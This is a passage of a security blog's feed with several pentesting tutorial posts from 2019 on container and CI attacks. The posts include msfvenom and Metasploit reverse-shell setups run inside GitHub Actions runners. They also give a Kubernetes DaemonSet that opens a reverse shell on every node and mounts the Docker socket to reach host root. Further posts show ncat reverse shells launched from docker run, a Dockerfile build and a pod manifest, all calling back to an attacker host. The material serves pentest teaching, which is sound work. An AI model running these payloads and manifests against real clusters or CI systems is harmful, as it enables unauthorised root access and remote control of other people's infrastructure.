&lt;p&gt;In the past I’ve looked at using &lt;a href=&quot;https://kind.sigs.k8s.io&quot;&gt;kind&lt;/a&gt; for this (with &lt;a href=&quot;https://raesene.github.io/blog/2019/03/04/kind-of-insecure-test-clusters/&quot;&gt;kind of insecure&lt;/a&gt;).  This works pretty well, but there are some limitations on what we can do in terms of setting up vulnerable environments with just kind on it’s own.&lt;/p&gt;

&lt;p&gt;Adding a configuration management tool to the mix can let us easily create more complex test environments.  Enter &lt;a href=&quot;https://www.ansible.com/&quot;&gt;Ansible&lt;/a&gt; which works pretty well for this application. It doesn’t require any server infrastructure, which is good for this kind of setup, and it’s possible to define a Docker container as the host for applying the actions to via a playbook.&lt;/p&gt;

&lt;h2 id=&quot;kube-security-lab&quot;&gt;Kube Security Lab&lt;/h2&gt;

&lt;p&gt;So I’ve started off the process of creating a set of vulnerable clusters as Ansible playbooks and put it &lt;a href=&quot;https://github.com/raesene/kube_security_lab&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The idea is that the &lt;code class=&quot;highlighter-rouge&quot;&gt;client-machine.yml&lt;/code&gt; playbook can be used to spin up a container with client tools installed (it’s just an instance of &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-containertools&quot;&gt;this image&lt;/a&gt; at the moment) and then bring up one or more of the vulnerable clusters as playbooks, practice attacking that configuration and then easily remove both the cluster and client container.&lt;/p&gt;

&lt;p&gt;In general you can spin up the client machine and a sample cluster, then port-scan the target cluster to see what’s exposed and start attacking things!&lt;/p&gt;

&lt;p&gt;There’s a starter set of playbooks up now, and I’ll plan to expand this as I get more ideas.  Also there should be walkthroughs for each of the clusters, in case people want the cheat sheet version :)&lt;/p&gt;

</description>
				<pubDate>Sat, 14 Sep 2019 17:10:39 +0100</pubDate>
				<link>/blog/2019/09/14/kube-security-lab/</link>
				<guid isPermaLink="true">/blog/2019/09/14/kube-security-lab/</guid>
			</item>
		
			<item>
				<title>Shells in Github Actions</title>
				<description>&lt;p&gt;I recently got my beta invite to the awesome &lt;a href=&quot;https://github.com/features/actions&quot;&gt;Github Actions&lt;/a&gt; feature.  This is a free to use CI/CD system.  If you’re not familiar with CI/CD, you can think of it as a system which runs a series of actions during your development process to help test/maintain/deploy it.  For example you could use CI to run your test suite on every commit, so you know if someone just broke the build.&lt;/p&gt;

&lt;p&gt;To do this we use “runners” which are essentially execution environments (e.g. a Virtual Machine) that runs our tests or other actions.&lt;/p&gt;

&lt;p&gt;Of course what do pentesters think, seeing the idea that someone’s going to let me execute commands somewhere… “hey can I get a shell on that?” :)&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/antitree/status/1164193020612423680?s=20&quot;&gt;Antitree got there first on twitter&lt;/a&gt; but I thought it could be fun to walk through the process in a little more detail than twitter’s format allows.&lt;/p&gt;

&lt;p&gt;The pre-requisite for this is that your Github account has actions enabled.  Once you’ve got that here’s a set of steps to get a shell on one of Github’s runners.&lt;/p&gt;

&lt;p&gt;It’s worth noting that what we’re detailing below isn’t likely any kind of security issue for Github, I’d expect that they’re providing dedicated ephemeral instances as CI runners, so you’re not likely to get access to anyone else’s infrastructure using this technique, it’s just a bit of fun :)&lt;/p&gt;

&lt;p&gt;One thing to note though in general for CI/CD environments is how important isolation is, if you’re running untrusted code in pipelines.  As we’ll show here, it’s pretty easy to get a shell back out of a runner, so don’t run these in a network with other important hosts…&lt;/p&gt;

&lt;h3 id=&quot;prepare-the-payload&quot;&gt;Prepare the payload&lt;/h3&gt;

&lt;p&gt;Just like in the previous post on &lt;a href=&quot;https://raesene.github.io/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/&quot;&gt;Kubernetes shells&lt;/a&gt; we’re going to use &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit&lt;/a&gt; for this.  So we need a reverse shell payload that we can call back to.  For this, you’ll need to have the port receiving the connection visible on the Internet with no firewall in the way, you could use something like a Digital Ocean droplet or EC2 instance for this.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x64/meterpreter_reverse_http LHOST=YOURIP LPORT=YOURPORT -f elf &amp;gt; reverse_shell.elf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;just replace &lt;code class=&quot;highlighter-rouge&quot;&gt;YOURIP&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;YOURPORT&lt;/code&gt; with your information.&lt;/p&gt;

&lt;p&gt;Now we’ve got a shell program, just start a new Github repository and add the shell to the repo.&lt;/p&gt;

&lt;h3 id=&quot;our-gtihub-action&quot;&gt;Our Gtihub Action&lt;/h3&gt;

&lt;p&gt;We just need to create our action now that will get triggered when we push changes to our Github repository.  Github actions live in &lt;code class=&quot;highlighter-rouge&quot;&gt;.github/workflows/&lt;/code&gt; and are in YAML format.  Create a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;testaction.yml&lt;/code&gt; in there and you can put something like this into the file.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;name: Shell

on: [push]

jobs:

  build:
 
    runs-on: ubuntu-latest
 
    steps:
    - uses: actions/checkout@v1
    - name: metasploit reverse shell
      run: ./reverse_shell.elf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now when we commit our repository, Github should run our action.  Before we do that make sure to set-up Metasploit to receive the connection.&lt;/p&gt;

&lt;h3 id=&quot;metasploit-handler&quot;&gt;Metasploit handler&lt;/h3&gt;

&lt;p&gt;after running &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; you can do the following steps&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set payload linux/x64/meterpreter_reverse_http&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set LHOST YOURIP&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set LPORT YOURPORT&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Then push your shell and action code to Github to trigger the action, and all being well you should get a shell :)&lt;/p&gt;

&lt;h3 id=&quot;looking-around-a-github-runner&quot;&gt;Looking around a Github runner&lt;/h3&gt;

&lt;p&gt;So once you’ve got your shell what can you see? Well it’s running an Ubuntu based distro, as we’d expect (it is possible to get Windows or indeed Mac runners, so you could repeat this exercise with them)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;“Privesc”&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;When you first get the shell, you’re running as the &lt;code class=&quot;highlighter-rouge&quot;&gt;runner&lt;/code&gt; user but it’s got passwordless &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; access, so you can just &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo bash&lt;/code&gt; to get &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Listening ports&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;ss -ltnp&lt;/code&gt; will show us the listening TCP ports&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         128                    [::]:22                  [::]:*  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The port &lt;code class=&quot;highlighter-rouge&quot;&gt;3306/TCP&lt;/code&gt; is kind of interesting, as my action didn’t make any use of MySQL.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Routing Table&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Nothing hugely interesting on the routing table, although interesting that &lt;code class=&quot;highlighter-rouge&quot;&gt;docker0&lt;/code&gt; is there, so we’re running Docker on the runner host.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.1.0.1        0.0.0.0         UG    100    0        0 eth0
10.1.0.0        0.0.0.0         255.255.0.0     U     0      0        0 eth0
168.63.129.16   10.1.0.1        255.255.255.255 UGH   100    0        0 eth0
169.254.169.254 10.1.0.1        255.255.255.255 UGH   100    0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Running Processes&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;One thing I thought was interesting, although not really surprising, is that there are quite a few dotnet core processes running on the host.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Users on the host&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A quick look at &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; shows up a couple of non-standard users&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pollinate:x:110:1::/var/cache/pollinate:/bin/false
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
sphinxsearch:x:112:117:Sphinx fulltext search service,,,:/var/run/sphinxsearch:/usr/sbin/nologin
runneradmin:x:1000:1000:Ubuntu:/home/runneradmin:/bin/bash
runner:x:1001:115:,,,:/home/runner:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;This is just a quick exploration of a Github Actions runner host, showing some of the techniques that can be used to get shells in CI systems, if you have the ability to submit commands to them.&lt;/p&gt;

&lt;p&gt;Overall Github actions looks really cool, and I’m looking forward to integrating it into a lot of my repo’s alongside their private repository feature.&lt;/p&gt;
</description>
				<pubDate>Sun, 25 Aug 2019 13:10:39 +0100</pubDate>
				<link>/blog/2019/08/25/shells-in-gh-actions/</link>
				<guid isPermaLink="true">/blog/2019/08/25/shells-in-gh-actions/</guid>
			</item>
		
			<item>
				<title>Making it Rain shells in Kubernetes</title>
				<description>&lt;p&gt;Following on from the &lt;a href=&quot;https://raesene.github.io/blog/2019/08/09/docker-reverse-shells/&quot;&gt;last post&lt;/a&gt; in this series lets setup a rather more ambitious set of reverse shells when attacking a Kubernetes cluster.&lt;/p&gt;

&lt;p&gt;The scenario here is that we’ve got the ability to create a &lt;code class=&quot;highlighter-rouge&quot;&gt;daemonset&lt;/code&gt; object in a target Kubernetes cluster and we’d like to have shells on every node in the cluster which have the Docker socket exposed, so we can get a root shell on every node in the cluster.&lt;/p&gt;

&lt;p&gt;To do this we’ll need something that’ll easily handle multiple incoming shells, so we’ll turn to the &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit Framework&lt;/a&gt; and specifically, &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit/multi/handler&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;step-1-create-the-payload&quot;&gt;Step 1: Create the payload&lt;/h2&gt;

&lt;p&gt;We need a Docker image that we can deploy to the cluster which will have our payload to connect back to the listener that we’re going to setup and will run on each node in the cluster.&lt;/p&gt;

&lt;p&gt;For this we can run msfvenom to setup our payload and then embed that into a Docker image.&lt;/p&gt;

&lt;p&gt;In this case our pentester machine will be on &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.200.1&lt;/code&gt; . To avoid managing all Metasploit’s dependencies we can just run it in a Docker container.&lt;/p&gt;

&lt;p&gt;This command will generate our payload&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/metasploit ./msfvenom -p linux/x64/meterpreter_reverse_http LHOST=192.168.200.1 LPORT=8989 -f elf &amp;gt; reverse_shell.elf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;setting-up-the-docker-image&quot;&gt;Setting up the Docker Image&lt;/h3&gt;

&lt;p&gt;Next run this command to get the Docker GPG key into your directory&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl https://download.docker.com/linux/ubuntu/gpg &amp;gt; docker.gpg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now create a Dockerfile to host this shell and upload it to Docker hub.  The Dockerfile is a pretty simple one, we’ll need out payload and also the Docker client, for later use.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04

RUN apt update &amp;amp;&amp;amp; apt install -y apt-transport-https ca-certificates curl software-properties-common

COPY docker.gpg /docker.gpg

RUN apt-key add /docker.gpg

RUN add-apt-repository \
   &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) \
   stable&quot;

RUN apt-get install -y docker-ce-cli

COPY reverse_shell.elf /reverse_shell.elf

RUN chmod +x /reverse_shell.elf

CMD [&quot;/reverse_shell.elf&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Build it with (replace raesene below with your own docker hub name)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker build -t raesene/reverse_shell .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then you can login to Docker hub with &lt;code class=&quot;highlighter-rouge&quot;&gt;docker login&lt;/code&gt; and upload with&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker push raesene/reverse_shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point we can test our reverse shell on a single machine by setting up a Metasploit listener and check that all is well.&lt;/p&gt;

&lt;h2 id=&quot;step-2-setting-up-metasploit-to-receive-our-shells&quot;&gt;Step 2: Setting up Metasploit to receive our shells&lt;/h2&gt;

&lt;p&gt;On the pentester machine start-up the metasploit console with&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfconsole
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;then&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/multi/handler
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and set our variables, in the same way we did with &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; earlier&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set payload linux/x64/meterpreter_reverse_http
set LHOST 192.168.200.1
set LPORT 8989
set ExitOnSession false
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With those set, we can start it up to listen for incoming shells&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exploit -j
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now on a target machine run our shell and we should get that back on the metasploit console&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/reverse_shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Assuming that’s all working we’re ready to scale it up to our Kubernetes cluster&lt;/p&gt;

&lt;h2 id=&quot;step-3-using-a-daemonset-to-compromise-a-cluster&quot;&gt;Step 3: Using a Daemonset to compromise a cluster&lt;/h2&gt;

&lt;p&gt;So we want a workload which will run on every node in the cluster, and that’s exactly what a daemonset will do for us.  We’ll need a manifest that creates our daemonset and also we want it to expose the Docker socket so we can easily break out of each of our containers to the underlying host.&lt;/p&gt;

&lt;p&gt;This should work fine, unless the cluster has a PodSecurityPolicy blocking the mounting of the docker socket inside a container.&lt;/p&gt;

&lt;p&gt;We’ll call our manifest &lt;code class=&quot;highlighter-rouge&quot;&gt;reverse-shell-daemonset.yml&lt;/code&gt; and it should contain this :-&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: reverse-shell-daemonset
  labels:
spec:
  selector:
    matchLabels:
      name: reverse-shell-daemonset
  template:
    metadata:
      labels:
        name: reverse-shell-daemonset
    spec:
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      containers:
      - name: revshell
        image: raesene/reverse-shell
        volumeMounts:
        - mountPath: /var/run/docker.sock
          name: dockersock
      volumes:
      - name: dockersock
        hostPath:
          path: /var/run/docker.sock
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve got your manifest ready, just apply it to the cluster with&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl create -f reverse-shell-daemonset.yml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Back on your metasploit console you should see your shells pop in, one for each node :)&lt;/p&gt;

&lt;h3 id=&quot;getting-to-root-on-the-nodes&quot;&gt;Getting to root on the nodes&lt;/h3&gt;

&lt;p&gt;So once you’ve got your shells working, you can interact with them from the Metasploit console&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions -l 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Will show you your active sessions.  Then&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions -i 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Will let you interact with one of them&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;should give you a shell inside the container running on one of our nodes. Now the last part is to use the exposed Docker Socket to get a root shell on the underlying host.&lt;/p&gt;

&lt;p&gt;To Do this we can juse make use of the every handy &lt;a href=&quot;https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/&quot;&gt;Most Pointless Docker Command Ever&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Running&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and it’ll dump us out to a root shell on the underlying node :)&lt;/p&gt;
</description>
				<pubDate>Sat, 10 Aug 2019 07:10:39 +0100</pubDate>
				<link>/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/</link>
				<guid isPermaLink="true">/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/</guid>
			</item>
		
			<item>
				<title>Docker and Kubernetes Reverse shells</title>
				<description>&lt;p&gt;A handy technique for any pentester is the ability to create a reverse shell. This allows for a variety of cases where you want to get access to restricted environments or want to extract information from a remote system.&lt;/p&gt;

&lt;p&gt;There’s a number of scenarios where this can apply to containerized environments, here’s a couple with the steps that could be used to setup a reverse shell using &lt;a href=&quot;https://nmap.org/ncat/&quot;&gt;ncat&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;reverse-shell-from-docker-run&quot;&gt;Reverse shell from docker run&lt;/h2&gt;

&lt;p&gt;Here we want to push a reverse shell back from a machine that we have &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; access to, this one is pretty simple&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
We just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat -l -p 8989
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Target Machine&lt;/strong&gt;
Here we just need a Docker image that has ncat available. I’ve got one &lt;a href=&quot;https://cloud.docker.com/u/raesene/repository/docker/raesene/ncat&quot;&gt;here&lt;/a&gt; on Docker hub.&lt;/p&gt;

&lt;p&gt;So we just run this image with ncat parameters to connect back to the pentester machine on 192.168.200.1&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/ncat 192.168.200.1 8989 -e /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;reverse-shell-from-a-dockerfile&quot;&gt;Reverse Shell from a Dockerfile&lt;/h2&gt;

&lt;p&gt;So in our next scenario we’ve got the ability to get our Target Machine to do a &lt;code class=&quot;highlighter-rouge&quot;&gt;docker build&lt;/code&gt; on a &lt;code class=&quot;highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt; that we control.  This is common in places where there are CI/CD processes like Jenkins or Drone, or cloud container building services.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Target Machine&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Here we need to construct our Dockerfile to pass into the process, this one should work based on a base ubuntu:18.04 image&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04

RUN apt update &amp;amp;&amp;amp; apt install -y nmap

RUN ncat 192.168.200.1 8989 -e /bin/sh

CMD [&quot;/bin/bash&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;when the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker build&lt;/code&gt; command is executed, the reverse shell will pop during the build process.&lt;/p&gt;

&lt;h2 id=&quot;kubernetes-cluster&quot;&gt;Kubernetes Cluster&lt;/h2&gt;

&lt;p&gt;So say you’ve got a Kubernetes cluster where you can create pods but otherwise your rights are limited, and you’d like to get a shell inside the cluster.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Target Cluster&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So we just need a Pod manifest that will open a reverse shell on your pentester machine when created.  The example below will create that kind of pod and additionally will mount the hosts root filesystem into &lt;code class=&quot;highlighter-rouge&quot;&gt;/host&lt;/code&gt;, although this will fail if a restrictive &lt;code class=&quot;highlighter-rouge&quot;&gt;PodSecurityPolicy&lt;/code&gt; is in place.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
kind: Pod
metadata:
  name: ncat-reverse-shell-pod
  labels:
    app: ncat
spec:
  containers:
  - name: ncat-reverse-shell
    image: raesene/ncat
    volumeMounts:
    - mountPath: /host
      name: hostvolume
    args: ['192.168.200.1', '8989', '-e', '/bin/bash']
  volumes:
  - name: hostvolume
    hostPath:
      path: /
      type: Directory
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For extra credit you could mount in the Docker socket from the underlying host and then break out relatively easily&lt;/p&gt;
</description>
				<pubDate>Fri, 09 Aug 2019 10:10:39 +0100</pubDate>
				<link>/blog/2019/08/09/docker-reverse-shells/</link>
				<guid isPermaLink="true">/blog/2019/08/09/docker-reverse-shells/</guid>
			</item>
		
			<item>
				<title>Docker Capabilities and no-new-privileges</title>
				<description>&lt;p&gt;I’ve been looking for a way to explain an demonstrate the “no-new-privileges” option in Docker for a little while for my &lt;a href=&quot;https://www.blackhat.com/us-19/training/schedule/#mastering-container-security-14020&quot;&gt;training course&lt;/a&gt; and recently came up with a way that should work, so thought it was worth a blog post.&lt;/p&gt;

&lt;h2 id=&quot;capabilities-and-docker&quot;&gt;Capabilities and Docker&lt;/h2&gt;

&lt;p&gt;First a little background.  Docker makes use of &lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;capabilities&lt;/a&gt; as one of the layers of security that it applies to all new containers. Capabilities are essentially pieces of the privileges that the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; user gets on a Linux system.  They enable processes to perform some privileged operations without having the full power of that user, and are very useful to get away from the use of &lt;code class=&quot;highlighter-rouge&quot;&gt;setuid&lt;/code&gt; binaries. Docker applies a restriction that when a new container is started, even if the root user is used, it won’t get all the capabilities of root, just a subset.&lt;/p&gt;

&lt;p&gt;An important point to note is that, if your process doesn’t need any “root-like” privileges, it shouldn’t need any capabilities, and processes started by ordinary users don’t generally get granted any capabilities.&lt;/p&gt;

&lt;p&gt;For more details on Docker and capabilities there’s a post &lt;a href=&quot;https://raesene.github.io/blog/2017/08/27/Linux-capabilities-and-when-to-drop-all/&quot;&gt;here&lt;/a&gt; that goes into some more depth on the topic.&lt;/p&gt;

&lt;h2 id=&quot;no-new-privileges&quot;&gt;no-new-privileges&lt;/h2&gt;

&lt;p&gt;So where does no-new-privileges come into all this?  Well this is an option that can be passed as part of a &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; statement as a security option.  The Docker documentation on it says you can use it&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;If you want to prevent your container processes from gaining additional privileges
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Basically if your container runs as a non-root user (as all good containers should) this can be used to stop processes inside the container from getting additional privileges.&lt;/p&gt;

&lt;p&gt;Here’s a practical example.  Say we have a Dockerfile that looks like this&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04

RUN cp /bin/bash /bin/setuidbash &amp;amp;&amp;amp; chmod 4755 /bin/setuidbash

